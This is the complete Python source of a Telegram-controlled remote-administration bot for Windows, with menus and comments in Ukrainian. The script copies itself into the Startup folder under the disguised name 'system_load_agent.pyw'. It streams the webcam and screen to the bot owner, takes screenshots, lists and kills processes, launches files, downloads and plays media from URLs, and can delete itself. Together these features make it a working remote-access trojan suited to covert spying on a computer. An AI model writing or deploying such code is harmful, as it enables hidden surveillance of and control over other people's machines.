import telebot
from telebot import types
import psutil
import socket
import os
import time
import subprocess
import mss
import cv2
import numpy as np
import shutil
import sys
import requests
import webbrowser
from threading import Thread
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import pygetwindow as gw
import pythoncom 
import pygame

# Імпортуємо pycaw безпечно
try:
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except: pass

# --- НАЛАШТУВАННЯ ---
TOKEN = 'BOT TOKEN'
ADMIN_ID = NUMBER ID OF YOUR ACCOUNT
CACHE_DIR = "cacheFolder"
# --------------------

# Створюємо папку кешу при запуску
if not os.path.exists(CACHE_DIR):
    os.makedirs(CACHE_DIR)

# Захист від подвійного запуску
try:
    lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lock_socket.bind(('127.0.0.1', 45030))
except: sys.exit()

bot = telebot.TeleBot(TOKEN)
hostname = socket.gethostname()
current_mode = None 
media_active = False

pygame.mixer.init()

# --- СИСТЕМНІ ФУНКЦІЇ ---

def add_to_startup():
    try:
        path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', "system_load_agent.pyw")
        if not os.path.exists(path): 
            shutil.copy2(os.path.abspath(sys.argv[0]), path)
    except: pass

def clear_cache_files():
    """Видаляє всі файли з папки кешу"""
    pygame.mixer.music.unload() # Звільняємо файл, якщо він грає
    for filename in os.listdir(CACHE_DIR):
        file_path = os.path.join(CACHE_DIR, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
        except Exception as e: print(f"Error clearing {file_path}: {e}")

def get_process_lists():
    apps, bg_list = [], []
    visible_windows = [w.title.lower() for w in gw.getAllWindows() if w.title != ""]
    for p in psutil.process_iter(['pid', 'name']):
        try:
            p_str = f"{p.info['pid']} {p.info['name']}"
            if any(p.info['name'].lower().replace('.exe','') in w for w in visible_windows):
                apps.append(p_str)
            else: bg_list.append(p_str)
        except: continue
    return "\n".join(apps[:50]), "\n".join(bg_list[:100])

# --- МЕНЮ ---

def markup_main():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("📋 Список процесів", callback_data="open_list"),
        types.InlineKeyboardButton("📸 Скріншот HD", callback_data="open_screen"),
        types.InlineKeyboardButton("🎬 Екран HD", callback_data="str_on"),
        types.InlineKeyboardButton("📷 Камера HD", callback_data="cam_on"),
        types.InlineKeyboardButton("🛠 Інструменти", callback_data="open_tools"),
        types.InlineKeyboardButton("ℹ️ Синтаксис", callback_data="open_syntax"),
        types.InlineKeyboardButton("🛑 STOP (Stream)", callback_data="stop_all"),
        types.InlineKeyboardButton("💣 ВИДАЛИТИ БОТА", callback_data="self_destruct")
    )
    return m

def markup_tools():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🔊 Гучність", callback_data="h_sound"),
        types.InlineKeyboardButton("🖼 Медіа", callback_data="h_media"),
        types.InlineKeyboardButton("🎵 Play", callback_data="h_play"),
        types.InlineKeyboardButton("🌐 Web", callback_data="h_web"),
        types.InlineKeyboardButton("🚀 Push", callback_data="h_push"),
        types.InlineKeyboardButton("💀 Kill", callback_data="h_kill"),
        types.InlineKeyboardButton("🧹 Очистити кеш", callback_data="clear_cache"),
        types.InlineKeyboardButton("⬅️ НАЗАД", callback_data="open_main")
    )
    return m

def markup_back():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("⬅️ НАЗАД В МЕНЮ", callback_data="open_main"))
    return m

# --- ТРАНСЛЯЦІЯ ---

def hd_stream(chat_id, mode):
    global current_mode
    cap, sct, sent_msg = None, None, None
    try:
        if mode == 'camera':
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            cap.set(3, 1280); cap.set(4, 720)
        else: sct = mss.mss()
        while current_mode == mode:
            if mode == 'camera':
                ret, frame = cap.read()
                if not ret: break
            else:
                img = np.array(sct.grab(sct.monitors[1]))
                frame = cv2.resize(cv2.cvtColor(img, cv2.COLOR_BGRA2BGR), (1280, 720))
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            if sent_msg is None:
                sent_msg = bot.send_photo(chat_id, buffer.tobytes(), caption=f"💎 HD {mode.upper()}")
            else:
                bot.edit_message_media(media=types.InputMediaPhoto(buffer.tobytes(), caption=f"💎 HD {mode.upper()} | {time.strftime('%H:%M:%S')}"), chat_id=chat_id, message_id=sent_msg.message_id)
            time.sleep(2.5)
    except: pass
    finally:
        if cap: cap.release()
        current_mode = None

# --- ОБРОБКА КНОПОК ---

@bot.callback_query_handler(func=lambda call: True)
def callback_logic(call):
    global current_mode
    if call.from_user.id != ADMIN_ID: return
    cid, mid = call.message.chat.id, call.message.message_id

    try:
        if call.data == "open_main":
            try: bot.edit_message_text(f"🕹 <b>Меню: {hostname}</b>", cid, mid, parse_mode='HTML', reply_markup=markup_main())
            except: 
                bot.delete_message(cid, mid)
                bot.send_message(cid, f"🕹 <b>Меню: {hostname}</b>", parse_mode='HTML', reply_markup=markup_main())

        elif call.data == "open_tools":
            bot.edit_message_text(f"🛠 <b>Інструменти: {hostname}</b>", cid, mid, parse_mode='HTML', reply_markup=markup_tools())

        elif call.data == "open_syntax":
            text = f"ℹ️ <b>Синтаксис:</b>\n\n<code>/list {hostname}</code>\n<code>/play [url] {hostname}</code>\n<code>/play stop {hostname}</code>\n<code>/media [url] {hostname}</code>\n<code>/media stop {hostname}</code>"
            bot.edit_message_text(text, cid, mid, parse_mode='HTML', reply_markup=markup_back())

        elif call.data == "open_list":
            apps, bgs = get_process_lists()
            text = f"🖥 <b>Процеси {hostname}</b>\n\n<b>📌 Програми:</b>\n<blockquote expandable>{apps if apps else 'Порожньо'}</blockquote>\n\n<b>⚙️ Фон:</b>\n<blockquote expandable>{bgs}</blockquote>"
            bot.send_message(cid, text, parse_mode='HTML', reply_markup=markup_back())

        elif call.data == "open_screen":
            with mss.mss() as s:
                s.shot(output="s.png")
                with open("s.png", "rb") as f: bot.send_photo(cid, f, caption=f"📸 Скрін {hostname}", reply_markup=markup_back())
                os.remove("s.png")

        elif call.data == "clear_cache":
            clear_cache_files()
            bot.answer_callback_query(call.id, "🧹 Кеш очищено!")

        elif call.data == "self_destruct":
            # Видалення автозапуску
            startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', "system_load_agent.pyw")
            if os.path.exists(startup): os.remove(startup)
            # Очищення кешу перед видаленням
            clear_cache_files()
            if os.path.exists(CACHE_DIR): shutil.rmtree(CACHE_DIR, ignore_errors=True)
            
            bot.edit_message_text("💣 Скрипт та кеш повністю видалені.", cid, mid)
            subprocess.Popen(f"timeout /t 2 /nobreak & del /f /q \"{os.path.abspath(sys.argv[0])}\"", shell=True)
            sys.exit()

        elif call.data.startswith("h_"):
            hints = {"h_sound":"/sound 50", "h_media":"/media [url]", "h_play":"/play [url]", "h_web":"/web [url]", "h_push":"/push [path]", "h_kill":"/kill [pid]"}
            bot.edit_message_text(f"⌨️ Команда:\n<code>{hints[call.data]} {hostname}</code>", cid, mid, parse_mode='HTML', reply_markup=markup_tools())
            
        elif call.data == "stop_all":
            current_mode = None
            bot.answer_callback_query(call.id, "🛑 Стрім зупинено.")
            
    except Exception as e: print(f"CB Error: {e}")

# --- ТЕКСТОВІ КОМАНДИ ---

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def text_handler(message):
    global media_active
    try:
        if hostname.lower() not in message.text.lower(): return
        args = message.text.split()
        cmd = args[0].lower()

        if cmd == '/play':
            if args[1].lower() == 'stop':
                pygame.mixer.music.stop()
                bot.reply_to(message, "🎵 Звук зупинено.")
            else:
                def play_worker(url):
                    try:
                        r = requests.get(url)
                        p = os.path.join(CACHE_DIR, f"track_{int(time.time())}.mp3")
                        with open(p, 'wb') as f: f.write(r.content)
                        pygame.mixer.music.load(p)
                        pygame.mixer.music.play()
                    except: pass
                Thread(target=play_worker, args=(args[1],), daemon=True).start()
                bot.reply_to(message, "🎵 Запущено фоновий звук.")

        elif cmd == '/media':
            if args[1].lower() == 'stop':
                media_active = False
                cv2.destroyAllWindows()
                bot.reply_to(message, "🖼 Медіа закрито.")
            else:
                def media_worker(url):
                    global media_active
                    try:
                        r = requests.get(url)
                        p = os.path.join(CACHE_DIR, f"img_{int(time.time())}.jpg")
                        with open(p, 'wb') as f: f.write(r.content)
                        img = cv2.imread(p)
                        media_active = True
                        cv2.namedWindow("Media", cv2.WND_PROP_FULLSCREEN)
                        cv2.setWindowProperty("Media", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
                        while media_active:
                            cv2.imshow("Media", img)
                            if cv2.waitKey(1) & 0xFF == ord('q'): break
                        cv2.destroyAllWindows()
                    except: pass
                Thread(target=media_worker, args=(args[1],), daemon=True).start()
                bot.reply_to(message, "🖼 Фото на весь екран.")

        elif cmd == '/sound':
            pythoncom.CoInitialize()
            level = int(args[1].replace('%',''))
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(level / 100, None)
            bot.reply_to(message, f"🔊 Гучність {level}%")

        elif cmd == '/kill':
            psutil.Process(int(args[1])).terminate()
            bot.reply_to(message, "💀 Вбито")

        elif cmd == '/push':
            os.startfile(args[1])
            bot.reply_to(message, "🚀 Запущено")

        elif cmd == '/web': 
            webbrowser.open(args[1])
            bot.reply_to(message, "🌐 Відкрито")
            
    except Exception as e: bot.reply_to(message, f"❌ Помилка: {e}")

if __name__ == "__main__":
    add_to_startup()
    try:
        bot.send_message(ADMIN_ID, f"🌟 <b>{hostname} ОНЛАЙН</b>", parse_mode='HTML', reply_markup=markup_main())
    except: pass
    bot.polling(none_stop=True)